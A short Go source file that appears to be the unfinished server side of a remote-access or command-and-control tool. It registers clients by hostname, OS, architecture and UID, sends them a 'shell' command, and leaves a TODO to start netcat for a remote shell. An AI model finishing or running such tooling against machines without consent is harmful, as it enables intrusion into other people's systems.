package utils

import (
    "net"
    "log"
    "os"
    "fmt"
    )


type Logger struct {
    InfoLogger *log.Logger
    ErrorLogger *log.Logger
}

func (l *Logger) Start(logFile *os.File) {
    l.InfoLogger = log.New(logFile, "INFO: ", log.LstdFlags | log.Lshortfile)
    l.ErrorLogger = log.New(logFile, "ERROR: ", log.LstdFlags | log.Lshortfile)
}


type Server struct {
    Host         string
    Port         string
    Type         string
    ServerSocket net.Listener
    Clients      []Client
}

// Starts boilerplate data on server
func (server *Server) AssignData() {
    server.Host = "localhost"
    server.Port = "9988"
    server.Type = "tcp"
}

// Send message informing client that he was registered
func (server *Server) SendConfirmationMessageToClient(client *Client, logger *Logger) {
    clientConn, err := net.Dial("tcp", client.IP+":"+client.Port)
    if err != nil {
        logger.ErrorLogger.Println("Error connecting to client socket:", err.Error())
    } else {
        clientConn.Write([]byte("REGISTERED"))
    }
}


// Sends command to client
func (server *Server) SendCommandToClient(client Client, input string, logger *Logger) {
    clientConn, err := net.Dial("tcp", client.IP+":"+client.Port)
    if err != nil {
        logger.ErrorLogger.Println("Error connecting to client socket:", err.Error())
    } else {
        if input != "shell" {
            logger.ErrorLogger.Println("Error, command not found -> ", input)
        } else {
            clientConn.Write([]byte(input))
            fmt.Println(input)
            // TODO: start nc here
            // maybe use a nc implementation in go, or try to execute from os.exec
        }
    }
}


// Struct that represents a client
type Client struct {
    Id       string
    Hostname string
    Os       string
    Arch     string
    IP       string
    Port     string
    Uid      string
}


// Struct to handle data for the API
type Data struct {
    Command string    `json:"command"`
    Result  string    `json:"result"`
    Time    string    `json:"time"`
}
